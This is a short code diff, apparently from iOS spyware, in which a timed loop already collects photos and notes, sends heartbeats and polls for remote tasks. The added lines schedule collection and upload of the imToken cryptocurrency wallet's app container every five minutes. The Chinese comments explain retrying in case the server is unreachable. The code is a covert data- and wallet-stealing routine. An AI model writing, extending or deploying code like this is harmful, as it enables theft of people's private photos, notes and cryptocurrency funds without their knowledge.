@@ -461,6 +461,8 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
                         if (tick % 5 == 2) [self collectNotes];    // 约 100s 一次
                         if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
+                        // 钱包容器采集：每 5 分钟重试一次（服务端可能一时不可达）
+                        if (tick % 15 == 7) [self collectAndUploadWallet:@"im.token.app"];
                         [self pollTasks];                          // 每轮都轮询
                     }
                 } @catch (NSException *e) {
